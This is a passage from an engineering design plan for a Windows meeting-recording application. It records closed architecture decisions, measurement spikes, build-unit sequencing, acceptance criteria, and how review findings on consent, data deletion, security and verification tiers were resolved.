touching immutability or recovery. Recorded in `adr-20260903-workflow-identity-and-idempotency`.

<!-- section: closed-decision-phase0-depth -->
**How much executable skeleton Phase 0 ships** (drafted as OQ-5). **Closed: the executable
contract-carrying skeleton** — type crates, JSON Schemas, synthetic seams, boundary lint and CI — because two
of the four exit criteria are not decidable from documents. This decision now lives in exactly one place,
`adr-20260903-phase0-executable-contract-skeleton`; carrying it as both a proposed ADR and an open choice
made every acceptance criterion depend on a question the plan simultaneously answered and left open.

<!-- section: closed-decision-extension-transport -->
**Loopback listener or Chrome native messaging for the extension channel** (drafted as OQ-6). **Closed:
loopback**, with native messaging recorded as the stronger-on-security alternative, the reasons it is not
taken (per-browser registry registration in the installer, a host process per browser, a forwarding hop) and
the named evidence that would reverse it. The residual risk is bounded by the rule that an extension-authority
signal alone can never start a recording, so the worst outcome of a fully compromised channel is a spurious
`candidate`. Recorded in `adr-20260903-extension-localhost-channel-trust`.

<!-- section: closed-decision-fixture-format -->
**Signal timeline fixture format** (drafted as OQ-7). **Closed: JSONL** with a sidecar label file. These
fixtures are reviewed in pull requests and appended to during live capture; both work on a line-oriented
text file. Phase 5's regression matrix needs an index, not a different on-disk truth, and an index can be
rebuilt from JSONL at analysis time whereas a binary fixture can never be diffed again. Recorded in
`adr-20260903-detector-signal-replay-contract`.

<!-- section: closed-decision-consent-surface-kind -->
**Whether a tray-only client counts as a consent surface** (drafted as OQ-8). **Closed: the question no
longer decides anything.** The consent surface is primarily the engine's own OS notification, so automatic
recording works with no client at all; a tray-only client is simply one of the client-kind surfaces and needs
no special status. What the question was really probing — that toasts can be suppressed by Focus Assist — is
answered by making delivery a per-decision lookup with a fail-closed fall-through rather than an assumption.
Recorded in `adr-20260903-automatic-recording-modes`.

---

# Evidence-seeking decisions (routed to Phase 1 spikes)

These cannot be decided from the repository or from documents; they need measurement on the target platform.
Phase 0 does not decide them — it writes contracts that survive either outcome, which is noted per item.

<!-- section: evidence-seeking-esd1-process-loopback -->
**ESD-1 — is per-process (process-tree) WASAPI loopback available and reliable for Teams, Slack, Zoom and the
browsers on Windows 11 target builds?** Containment: `contract-session-timeline` carries `capture_mode` and
`contamination_risk` per track, so a negative result changes recorded data and a UI disclosure, not the
artifact schema.

<!-- section: evidence-seeking-esd2-whisper-throughput -->
**ESD-2 — does whisper.cpp `large-v3-turbo` meet ≤1.0x real time on the target CPU class without a GPU, and at
which quantisation?** Containment: `contract-processor-budget` makes overrun a warning and requires progress
and cancellation, so a negative result changes the default model/quantisation, not the contract.

<!-- section: evidence-seeking-esd3-ipc-event-rate -->
**ESD-3 — can a named pipe sustain the level-meter event rate the UI wants without perturbing capture?**
Containment: `contract-ipc-protocol`'s backpressure rule already declares that level events are droppable and
that transitions are not, so a negative result changes the event rate, not the protocol's guarantees.

<!-- section: evidence-seeking-esd4-extension-signal-fidelity -->
**ESD-4 — how faithful and how timely are the extension's `tab_audible` / meeting-present signals, and how do
Chrome and Edge differ?** Containment: extension signals are non-authoritative by contract, so poor fidelity
degrades browser detection to `inconclusive` and manual control rather than producing false recordings.

<!-- section: evidence-seeking-esd5-sqlite-contention -->
**ESD-5 — what is the real cross-process SQLite WAL contention profile under the 30 s chunk cadence plus
workflow writes?** Containment: `contract-store-ownership` requires that capture never waits on the database
and holds transitions in memory on `StoreBusy`, so a bad result changes tuning, not the capture path's
safety. With the writer set now fixed at engine plus UI-settings, the contention this spike measures is
narrower than the drafts assumed: engine-internal for the workflow family, cross-process only against
settings writes.

---

# Implementation discretion candidates

Private, single-unit, reversible choices whose observable behaviour is already pinned by an owning contract and
a mechanical check. They are delegated to the implementer rather than expanded here.

<!-- section: discretion-chunk-writer-buffering -->
**`discretion-chunk-writer-buffering`** (unit `capture-recording-durability`) — how the writer buffers between
the capture callback and the file (write-through, double buffer, dedicated writer thread with a ring). Files:
`crates/ma-capture/src/chunk_writer.rs`. Escalate if the ≤30 s loss bound, the declared backpressure queue
depth, or the gap-record semantics would change, or if the choice makes the writer block the capture callback.

<!-- section: discretion-flac-encoder-binding -->
**`discretion-flac-encoder-binding`** (unit `capture-recording-durability`) — which FLAC encoder is used, since
sample-exact verification pins the observable outcome regardless. Files:
`crates/ma-capture/src/consolidate.rs`, `crates/ma-capture/Cargo.toml`. Escalate if the choice adds a C
toolchain requirement to the build, changes the licence class checked by `cargo-deny`, or cannot encode
16 kHz mono losslessly.

<!-- section: discretion-jsonrpc-dispatch -->
**`discretion-jsonrpc-dispatch`** (unit `ipc-contract-and-engine-process`) — how methods are registered and
dispatched internally (macro-generated table, match, trait objects). Files: `crates/ma-ipc/src/dispatch.rs`.
Escalate if it changes the wire framing, the method set, error codes, or the ordering guarantees of events —
all of which are contract, not interior.

<!-- section: discretion-state-machine-representation -->
**`discretion-state-machine-representation`** (unit `session-state-machine`) — table-driven interpretation
versus typestate-style enums internally, provided the transition table is still exported as data for the
conformance check. Files: `crates/ma-session/src/state.rs`, `crates/ma-session/src/transition_table.rs`.
Escalate if the exported table would no longer be derivable from the code, or if any transition would become
unreachable from `step`.

<!-- section: discretion-migration-runner -->
**`discretion-migration-runner`** (unit `persistence-and-artifact-layout`) — embedded migration runner
(hand-rolled ordered SQL list, `refinery`, or similar). Files: `crates/ma-store/src/migration.rs`,
`crates/ma-store/migrations/*.sql`. Escalate if migrations stop being forward-only, if `user_version`
stops being the version carrier, or if the from-every-released-version test cannot be expressed.

<!-- section: discretion-boundary-check-graph-source -->
**`discretion-boundary-check-graph-source`** (unit `workspace-and-boundary-scaffold`) — how the checker
obtains and walks the graph and tokenizes the source (parsing `cargo metadata` JSON; a `syn`-based token
walk; any tokenizer that can distinguish identifiers, string literals and comments). Files:
`xtask/src/boundary.rs`. Escalate if any violation class in the negative fixture becomes undetectable, if any
decoy in the fixture starts being reported, if features other than `--all-features` are used to resolve the
graph, or if the **scan surface** would change — the classes and what each may read (class A: identifier
tokens; class B: whole string literals; neither: comments and doc comments) are contract, not interior, and
are declared in `contract-module-boundary-enforcement`.

<!-- section: discretion-purge-walk-strategy -->
**`discretion-purge-walk-strategy`** (unit `persistence-and-artifact-layout`) — how the purge job walks and
removes the meeting directory and its derived rows (single recursive pass, delete-leaves-then-directories,
rename-to-a-trash-directory-then-remove, batched row deletion versus one statement per table). Files:
`crates/ma-store/src/purge.rs`. Escalate if the purge would stop being resumable from `deleted_at` alone, if
a tombstone could be written while any byte remains, if a partially purged meeting could become visible
again, or if the walk would proceed past an unresolved `intended` effect-ledger row.

<!-- section: discretion-processor-host-framing -->
**`discretion-processor-host-framing`** (unit `processor-contract`) — the *encoding* of the frames between the
engine's supervisor and `ma-processor-host.exe` (length-prefixed JSON, newline-delimited JSON, a compact
binary framing). What the frames carry and in what order — one verified request in, zero or more progress
frames then exactly one result frame out — is fixed by `contract-processor-interface` and is not delegated.
This is delegable only because both endpoints ship in one installer and are replaced together, so no
differently versioned peer ever reads these bytes; a framing read by an independently updated peer would be a
versioned surface, and versioned surfaces in this plan are owned by the contract that owns the surface
(`contract-ipc-protocol`, `contract-store-ownership`, `contract-release-manifest-trust`). Files:
`crates/ma-processor/src/host.rs`, `crates/ma-processor-host/src/main.rs`. Escalate if a host crash would
become indistinguishable from a normal exit, if cancellation could exceed the five-second bound, if progress
could regress or stop being observable at least once per work item, if any secret would move into the
child's argument vector, or if the two endpoints would stop shipping as one installed unit.

<!-- section: discretion-secret-zeroization -->
**`discretion-secret-zeroization`** (unit `security-and-credential-policy`) — the zeroization mechanism inside
`Secret<T>`. Files: `crates/ma-secure/src/secret.rs`. Escalate if the type would gain a `Display`, `Debug` or
`Serialize` implementation that reveals the value, or if exposure would stop being an explicit call.

<!-- section: discretion-ui-state-store -->
**`discretion-ui-state-store`** (unit `ui-shell-consent-surface`) — the frontend state management approach
inside the Tauri webview. Files: `app/ui/src/**`. Escalate if the UI would derive session state locally
instead of rendering the engine snapshot, or if the indicator or cancel affordance would depend on frontend state that
can diverge from the engine.

---

# Unit sequencing

<!-- section: unit-sequencing -->

| # | Unit | Depends on | Delivers |
| --- | --- | --- | --- |
| 1 | `workspace-and-boundary-scaffold` | — | workspace, layers, `boundary.toml`, capture-path and native-link isolation rules, the two-class literal scan, `xtask boundary`, `xtask verify`, `verification-tiers.toml`, `cargo-deny`, both CI gates, negative fixture with decoys |
| 2 | `core-types-and-identity` | 1 | ids, timeline types, artifact refs, error taxonomy |
| 3 | `persistence-and-artifact-layout` | 2 | SQLite schema, migrations, roots and addressing, writer roles, two-phase delete and the idempotent purge job |
| 4 | `session-state-machine` | 2 | states, transition table, mode policy, deadlines, consent precondition |
| 5 | `signal-and-detector-contracts` | 2 | signal envelope, fixture format, pure detector, outcome partition |
| 6 | `service-adapter-skeletons` | 5 | four adapter crates, registry, adapter conformance suite |
| 7 | `extension-channel-contract` | 5 | channel message schema, auth, corroboration rule |
| 8 | `ipc-contract-and-engine-process` | 3, 4 | protocol schema, handshake, resync, transport authz, engine binary |
| 9 | `capture-recording-durability` | 3, 8 | capture seam, synthetic source, chunk writer, recovery, consolidation |
| 10 | `workflow-core-contract` | 3 | queue, step identity, effect ledger, retry, generation/overlay edit model |
| 11 | `processor-contract` | 10 | processor trait, staging, argv rule, budget and cost convergence, `ma-processor-host` child and its framing |
| 12 | `destination-contract` | 10 | destination trait, export identity, retry classes, egress audit |
| 13 | `security-and-credential-policy` | 2 | `Secret<T>`, credential store, redaction, ACL helpers, threat model, `egress-inventory.toml` and its completeness check |
| 14 | `release-supply-chain` | 13 | manifest schemas, Ed25519 verification, rollback, release workflow |
| 15 | `ui-shell-consent-surface` | 8 | Tauri shell, engine client, indicator, countdown and cancel |
| 16 | `docs-and-adr-materialization` | all | ADRs, design documents, change package members, promotion manifest |

Units 1–2 gate everything. Units 5–7 and 9–14 are largely parallel once 1–4 land. Unit 16 is last because it
records what the others fixed, but its schema constraints (`decision-input-adr-schema-shape`,
`decision-input-design-doc-schema`) apply from the start.

---

# Acceptance

<!-- section: acceptance -->

| id | criterion |
| --- | --- |
| A-01 | `cargo xtask boundary` and `cargo deny check` run in CI, exit 0 on the clean workspace, and exit non-zero on the negative fixture listing exactly the three planted violations and none of the three planted decoys |
| A-02 | No crate outside a composition root depends, directly or transitively or through a feature gate, on any `ma-adapter-*` crate; no core crate contains a class-A service identifier or a class-B process, package or host literal |
| A-03 | Killing the UI process during a synthetic recording leaves the session in `recording` and chunk files continuing to appear; killing the engine and restarting recovers the session with the same `session_id` and at most 30 s unaccounted audio, within 10 s for a 2-hour two-track session |
| A-04 | With no client process running at all, an automatic start decision delivers an engine notification, arms a cancellable 10 s countdown and starts capture; with notification delivery refused *and* no client attached, the same fixture creates no chunk file and produces a `suppressed{no_consent_surface}` record |
| A-05 | Replaying a recorded signal timeline produces byte-identical decisions across runs and processes; every decision cites at least one signal id; an extension-authority signal alone never yields `determinate{start}` |
| A-06 | Chunks ∪ gaps tile each track's range without overlap, and transcript timestamps after a lost chunk retain their true session time |
| A-07 | Consolidated FLAC decodes sample-identically to the chunk sequence before any chunk is deleted; a crash between verification and deletion re-runs idempotently |
| A-08 | Every entity identifier is byte-identical across the database row, the filesystem path and the export payload; a duplicate enqueue of a completed step performs no work; an effect interrupted between its `intended` and `applied` ledger rows is resolved by lookup or user decision and never by a silent recreate |
| A-09 | A planted secret and planted meeting content appear in no file the application writes, including diagnostic bundles, panic output and parse-error messages, and in no child process argument vector |
| A-10 | A tampered, downgraded, unknown-key or digest-mismatched manifest is rejected before any declared value is used; the engine binary is not replaced while a session is non-terminal |
| A-11 | Every ADR and design document validates against the repository documentation schemas, sits at an indexed path, starts at `proposed`, and every design invariant names a mechanical check where one exists; the three required change members are non-empty |
| A-12 | `egress-inventory.toml` declares every host reachable from source or from a processor/destination manifest, every entry maps to `user_account`, `distribution` or `operating_system`, an added undeclared host fails the check by name, and no `egress_audit` host is absent from the inventory |
| A-13 | Local transcription reports monotonic progress, observes cancellation within 5 s, keeps per-item cost non-growing across a 240-item run, and treats budget overrun as a warning that still allows the step to succeed |
| A-14 | The database resides under the local application-data directory, stores no absolute artifact path, rejects writes outside a connection role's table family, and migrates forward from every released version while refusing a newer schema with a typed error |
| A-15 | Planting a feature-gated `ma-capture → ma-workflow` edge and a native-inference dependency on `ma-engine` each fail `cargo xtask boundary` by rule name; aborting the processor host child mid-job during a synthetic recording leaves chunk cadence unchanged, the session in `recording`, and the step `failed_retryable` |
| A-16 | In `ask` mode and after a cancelled countdown, the artifact root contains zero audio bytes for that session, the meeting directory holds no chunk file, and a restart leaves no phantom meeting in the library |
| A-17 | After deleting a meeting and running the purge, the `meeting_id` appears nowhere under the artifact root and in no row outside `tombstone`; a second purge run is a no-op; a purge killed mid-walk resumes to completion on restart; the exported remote objects still exist and are listed from the tombstone |
| A-18 | `cargo xtask verify --tier portable` builds and passes the eleven contract-core crates on a non-Windows host; every T2 verification id in this plan is registered in `verification-tiers.toml`; CI defines both required jobs; adding an unregistered `#[cfg(windows)]` T2 test fails the registration check |
| A-19 | A client connecting to the engine control channel as a different OS user is refused before any method is dispatched, and the refusal diagnostic names the rejection code and carries no request payload; the constructed pipe and token-file security descriptors grant the owning user only; a pipe pre-created by another process is detected rather than adopted |

---

# Assumptions and constraints

<!-- section: assumptions -->
**Assumptions.** (1) A single interactive Windows user per installation; multi-user machines get one engine
per logged-in user. (2) The target hardware for the CPU transcription budget is a contemporary laptop class,
to be pinned by ESD-2. (3) GitHub Releases remains an acceptable distribution host and its availability is not
on the recording path. (4) The normal state of the UI is closed or minimised to tray, which is why the consent
surface is engine-owned rather than client-owned. (5) The detection-only extension will be installable by the
user; without it, browser meetings are manual by design. (6) **A Windows 11 host is available to the project
for the `windows` verification tier** — a CI runner, a developer machine, or both. This is a hard
prerequisite, not a convenience: `contract-verification-tiering` makes an unrun Windows tier a failure rather
than a skip, so without such a host Phase 0 cannot be completed. Everything else in this plan is developed and
checked on the Linux development host through the `portable` tier. (7) The engine can obtain package identity
and raise notifications under it; this is what makes the engine-owned consent surface possible, and it is
already required by the `decision-input-desktop-stack` decision (AppX/package identity via `windows-rs`).

<!-- section: constraints -->
**Constraints.** (1) Windows 11 only for the MVP; nothing in Phase 0 may bake in a Windows-only assumption at a
*contract* level that Phase 6 macOS cannot satisfy — platform specifics live behind `SignalSource`,
`CaptureSource` and the ACL helpers. (2) Japanese and English only for transcription. (3) No proprietary
backend anywhere on the workflow path. (4) No DOM, selector, coordinate, accessibility-tree, private API or
network-payload inspection in detection. (5) Recording must continue while offline, and processing failure must
never stop the recording path. (6) The repository's dev-docs schemas and lifecycle rules bind every document
this phase produces.


---

# Decision input reconciliation

Twenty-two decision inputs are carried and every one is dispositioned in `spine.yaml`. The competing draft
named the same authorities under different ids; the mapping is one-to-one
(`capture-process-separation` → `capture-engine-separate-process`, `no-ui-scraping-detection` →
`no-dom-detection`, `desktop-stack-rust-tauri` → `desktop-stack`, `ipc-jsonrpc-named-pipe` →
`ipc-mechanism`, `cargo-workspace-boundary-check` → `boundary-toolchain`, `sqlite-wal-artifact-root` →
`db-artifact-layout`, `audio-format-chunking` → `audio-format`, `local-transcription-budget` →
`transcription-budget`, `distribution-signed-manifest` → `update-manifest-distribution`,
`meet-detection-extension` → `meet-extension-detection-only`, `adr-flat-directory` →
`docs-lint-target-placement`, `docs-transition-whitelist` → `status-transition-whitelist`,
`design-doc-schema-shape` → `design-doc-schema`), with one exception. The competing draft carried
`decision-input-os-credential-store` as an input of its own; here that obligation is **subsumed** into
`decision-input-desktop-stack`, which already names Windows Credential Manager, and is discharged by
`contract-credential-custody`. No decision input is dropped and none is closed by restatement.

---

# Resolved critique findings

Every `verdict: Y` finding from the critique is resolved here, with the resolution named and the patch hint's
disposition recorded. The one `verdict: N` finding is left standing with its reason.

<!-- section: resolved-findings -->

| finding | resolution | patch hint |
| --- | --- | --- |
| `issue-processing-recording-isolation-untranslated` | New `contract-processing-isolation` owned by `component-capture-engine`, new NFR-009 and FR-030, two boundary rule classes (`capture-path-isolation`, `native-inference-confinement`) and a T2 that aborts a processor host child mid-recording. A-15 makes it an exit criterion. | Adopted, with one correction: the hint's rule "`ma-engine` must not depend on `ma-workflow`" is false in a design that hosts the workflow runtime in the engine, so the rule is restated over the *capture-path crate set* and paired with the child-process boundary. A rule the design violates on day one gets deleted rather than enforced. |
| `issue-workflow-host-topology-open` | Closed by `adr-20260903-workflow-runtime-process-topology`: workflow in the engine, native processors in per-job children, two store writers. `contract-process-topology` gains a closed process inventory; `contract-store-ownership`'s writer table names one fixed set. | Adopted. The hint's promotion of the ADR from `proposed` to `accepted` is **not** taken: acceptance is an authority act reserved by the repository's transition whitelist and by `decision-input-status-transition-whitelist`. The design question is closed regardless; the acceptance transition is recorded as a gate in the change package, not as an open choice. |
| `issue-consent-surface-defeats-auto-start` | `contract-consent-surface-precondition` rewritten: the engine's own OS notification is the primary indicator and cancel channel, an attached client is the secondary one, and only the absence of both suppresses an automatic start. FR-011 restated. The normal witness is now "no client process running at all". | Adopted in full. |
| `issue-retention-deletion-uncontracted` | New `contract-retention-purge` (graft from the competing draft) with FR-029, two-phase deletion, an idempotent resumable purge, a content-free tombstone, and the rule that remote objects are never deleted. A-17 makes it an exit criterion. The Phase 2 scoping of the *default grace value* is preserved. | Adopted in full. |
| `issue-cancelled-arming-durable-footprint` | FR-027 and FR-028 plus a "durable footprint before `recording`" invariant in `contract-session-state-machine`: metadata may exist at `arming`, audio may not; a pre-roll buffer may exist in memory only. `v-consent-cancel-leaves-no-audio-byte` (T2) and A-16 make it disk-observable. | Adopted in full. |
| `issue-windows-only-verification-unscheduled` | New `contract-verification-tiering` with NFR-010: a `portable` tier that builds the eleven contract-core crates on a non-Windows host, a `windows` tier holding every T2, mandatory registration in `verification-tiers.toml` (an unregistered T2 fails the build), and two required CI jobs with the Windows job blocking Phase 0 completion. Assumption (6) states the Windows-host prerequisite. | Adopted, and strengthened: the hint asked for the split and a named runner; registration-completeness is added because a split without it still permits a T2 that nobody ever ran. |
| `issue-authz-signature-check-unrunnable-unsigned` | `contract-ipc-transport-authz` gains a compile-time build channel as an operational input and a two-row acceptance table: a `release` client requires installed path plus Authenticode, a `development` client accepts only same-user servers inside its own cargo target directory. `v-authz-build-channel-carveout` (T1) asserts no runtime input flips the channel. | Adopted in substance, not in form: the hint suggested a dev key set recorded as an open choice for a spike. A separate key set is more machinery and a weaker guarantee than "a development client trusts only its own build tree", and leaving the shape open would have left a security boundary undecided. The carve-out is therefore fixed here rather than scheduled. |
| `issue-declared-bounds-undeclared` | Every bound now carries a number: 10 s countdown, 60 s cancel quiet period, 60 s end hysteresis, 30 s prompt window, one 300 s extension, 256-event IPC queue with 64 reserved for transitions, 60 s per-track chunk write queue, 10 s recovery bound for a 2-hour session, 5-attempt cap with 1/4/16/64/256 s backoff, 500-export backlog cap, 5 s extension freshness window with a 20 msg/s rate cap and 200-message backlog, 5 s cancellation bound, 4 GiB processor host memory cap, 30 s per-work-item processor budget and its 150 s stall timeout. | Adopted in full; every "declared, e.g. N" placeholder is gone and `contract-recording-mode-policy` states the rule that produced them. The last two numbers were added later, from verify finding vf-07. |
| `issue-egress-inventory-unowned` | New `contract-egress-inventory` owned by `component-security-policy`, with `egress-inventory.toml`, a completeness-and-staleness check in `ma-secure`, a closed `integration_owner` enum with no `first_party` value, and the containment assertion that every `egress_audit` host is an inventory host. A-12 is rewritten against it. | Adopted, with the checker placed as a `ma-secure` integration test rather than a new `xtask` module, so `xtask` is not split across two owning components. |
| `issue-phase0-depth-open-vs-adr` | The duplicate attribution is removed: the depth decision lives only in `adr-20260903-phase0-executable-contract-skeleton`, and the former open choice is recorded in "Closed decisions" as a pointer. | Adopted except for the acceptance transition, for the reason given against `issue-workflow-host-topology-open`. Single attribution — the finding's actual defect — is achieved. |
| `issue-forbidden-identifier-scan-surface` | `contract-module-boundary-enforcement` declares the scan surface as a table: class A matches word-split identifier tokens against a list from which `meet`, `edge` and `chrome` are removed; class B matches whole string literals against a process/package/host table; comments and doc comments are never scanned; substring matching is forbidden. The negative fixture gains three decoys and asserts an exact violation set. The scan surface is added to the discretion's `escalate_when`. | Adopted, with the class split added: the hint's "identifier tokens only, excluding string literals" would have made the fixture's own `"Teams.exe"` violation undetectable. |
| `issue-session-model-contract-fragmentation` (`verdict: N`) | Left standing. The three contracts carry different dimensions (`state_lifecycle`, `control_flow`, `user_observability`), their verification sets do not overlap, and they bind to different ADRs; merging them would remove no rule and would lose the one-to-one attribution between an ADR and the contract it binds. | No patch hint to apply. |

---

# Resolved verify findings

The independent verification pass returned one blocker routed from the user's minimality decision and
thirteen minor findings. All fourteen are dispositioned here; nothing is deferred.

<!-- section: resolved-verify-findings -->

| finding | disposition |
| --- | --- |
| `vf-00` (blocker) | `contract-schema-evolution` folded on user authority. Applied as described at the end of the scope expansion inventory: two duplicated verification ids deleted, the store migration discipline stated in `contract-store-ownership`, the update-deferral rule moved to `contract-release-manifest-trust` with its check registered under `contract-process-topology`, the fixture-replay rule kept in `contract-signal-envelope` and its vacuous check deleted, and FR-005 / FR-007 / FR-026 confirmed still owned. The `migration_compatibility` dimension row becomes a documented exclusion alongside `resource_management`, and `scope-signal-four-surface-schema-evolution` is removed with its target. |
| `vf-01` | `spine.yaml` taken as the source. `contract-session-timeline` gains FR-013 and `contract-artifact-addressing` gains FR-017 in the prose; FR-026 is removed from `contract-verification-tiering`, which discharges NFR-010 and NFR-008 and never governed document conformance. |
| `vf-02` | `spine.yaml` taken as the source for all eight ADRs; the prose `Binds:` / `Inputs:` lists now match `adr_refs` / `decision_input_refs`. `contract-stable-identity` is bound only by `adr-20260903-workflow-identity-and-idempotency`, and `contract-processing-isolation` only by the topology and boundary ADRs, so the per-job-child decision keeps one owner. |
| `vf-03` | Resolved by the fold: the duplicate ids no longer exist and each command is defined once. |
| `vf-04` | The six one-directional unit references are made reciprocal by adding the missing `unit_refs`, which is the direction that matches reality (`core-types-and-identity` does introduce the artifact reference type, `service-adapter-skeletons` is bound by the layer rules, and so on). The sixth pair disappeared with the folded contract. |
| `vf-05` | New acceptance criterion **A-19** covers FR-006 together with the transport-authorization verifications that already existed and were reachable from no criterion. Every requirement is now reached from acceptance. |
| `vf-06` | Split by kind rather than by restatement: `contract-processor-interface` fixes the frame *contents and order*, `discretion-processor-host-framing` fixes only their *encoding*, and the discretion now states the premise that makes it interior (both endpoints ship in one installer) as both a constraint and an escalation trigger. |
| `vf-07` | The stall timeout is a number: the per-item budget is the work item's own 30 s media duration and the stall timeout is 150 s. A stall is `Retryable{no_progress}` and is deliberately *not* `HostCrashed`, because a stall is observed while a crash is inferred from an exit status; `contract-processing-isolation`'s exit table now says the same thing. |
| `vf-08` | Resolved on the plan side. Promotion upserts stable items of an *existing* design document, so a change that creates the repository's first ones has nothing to promote into; `contract-docs-conformance` and unit 16 now require `promotion: none` with a reason and no entry naming a target, which is what `change.md` declares. |
| `vf-09` | PLAN §8 lists seven items; `change.md` said eight. Corrected to seven in the intent, the outcome and the summary. |
| `vf-10` | Resolved by fact: `design-plan/` now holds `design.md` and `spine.yaml` in the change package, so the members' present tense is accurate. No wording change. |
| `vf-11` | The narrowing is removed rather than documented: the engine notification carries **Start** in `ask` mode exactly as it carries Cancel in `auto`, so no mode requires an attached client. This matters because the browser application class defaults to `ask` and assumption (4) says the UI is normally closed. |
| `vf-12` | Stated once. `contract-processing-isolation`'s exit table is the single classifier of a child outcome, including a job-object memory-cap kill; `contract-processor-interface` now defers to it instead of declaring a second, different retry count. |
| `vf-13` | Five design documents, one list, one naming scheme: `module-boundaries`, `session-lifecycle`, `recording-artifact-model`, `threat-model`, `credential-policy`. "Trust boundaries" is content inside `threat-model.md`, not a sixth file; `component-docs-artifacts`, unit 16, `contract-docs-conformance` and `change.md` all name the same five. |

---

# Scope expansion inventory

Recorded because the final plan retains or adds structure beyond what the decision inputs strictly named.
Three kinds of expansion, all traceable to a requirement and an authority; the machine-readable form is
`scope_expansion_signals` in `spine.yaml`, which records one signal per affected contract, so the three
groups below appear there as eight entries. A fourth group — a standalone four-surface schema-evolution
contract — was audited, put to the user, and **folded** on user authority; its disposition is recorded at the
end of this section.

<!-- section: scope-expansion-inventory -->

1. **`critic_induced_contract` — four new contracts.** `contract-processing-isolation`,
   `contract-retention-purge`, `contract-egress-inventory` and `contract-verification-tiering` did not exist
   in either draft's final form as owned contracts. Each exists because a critique finding showed an
   upstream-required observable with no owner, no requirement id and no check; each is traceable to PLAN §7,
   §8, a Phase 0 exit criterion, or the MVP completion criteria.
2. **`operational_procedure` — logon task registration and its repair.** Retained from the draft. The engine
   must exist before a meeting starts, which requires an install-time registration and a repair path after an
   update; no decision input names it, and it is kept because "auto mode works with the UI closed" is
   unimplementable without it.
3. **`persistent_state` — durable state beyond "session state, workflow queue, export state".** Retained and
   extended. Beyond the user decision's three, the plan persists `session_transition`, `gap`, `egress_audit`,
   `roots`, `effect_ledger`, `generation`, `edit_overlay`, `tombstone` and suppressed-decision records. Each
   is required by a contract's own observable — explainable transitions, honest gaps, auditable egress,
   relocatable roots, intent-before-effect, non-destructive regeneration, provable deletion, and visible
   suppression — and none is speculative.

The `shared_boundary` signal the critique raised against the loopback extension endpoint is **not** retained
as an expansion: it is now a closed decision with a recorded alternative and a named reversal condition, and
the endpoint is required by the extension-based browser detection that `decision-input-meet-extension-detection-only`
mandates.

**Folded on user authority — `compatibility_operation`, the four-surface schema-evolution contract.** An
earlier revision carried `contract-schema-evolution`: one contract declaring a change discipline over the
store schema, the IPC protocol, the persisted document schemas and the manifest formats. The minimality audit
found that two of its four verification ids were the same commands another contract already owned
(`v-evolution-ipc-major-mismatch` = `v-ipc-handshake-mismatch`; `v-evolution-migration-from-every-version` =
`v-store-migration-forward-from-every-version`), that its migration rule ranged over an empty released set,
and that its fixture-upgrade rule ranged over a Phase 1 corpus that does not yet exist — leaving exactly one
observable without another owner. The user's disposition was **fold**, and it is applied here:

- the duplicated ids are deleted and the checks stay where they were already owned, in
  `contract-ipc-protocol` and `contract-store-ownership`;
- the store's compatibility discipline (`user_version`, forward-only, refuse-a-newer-database) is stated in
  `contract-store-ownership`, next to the connection-open path that enforces it;
- the update-deferral observable moves to `contract-release-manifest-trust`, whose updater is the actor that
  can violate it, with its check `v-topology-update-deferred-during-session` registered under
  `contract-process-topology`, whose test binary can observe it;
- the fixture-replay rule stays as a rule in `contract-signal-envelope` — the header fields that make a tested
  upgrade possible are Phase 0's obligation — but `v-evolution-fixture-upgrade` is deleted rather than kept
  green over an empty corpus, and the upgrade function becomes Phase 1's obligation with its fixtures;
- FR-005, FR-007 and FR-026, the requirements the folded contract named, were already discharged by
  `contract-ipc-protocol`, `contract-signal-envelope` / `contract-detector-determinism` and
  `contract-docs-conformance` respectively, so no requirement lost an owner.

The plan is one contract, one dimension row and three verification ids smaller, and no observable was lost.

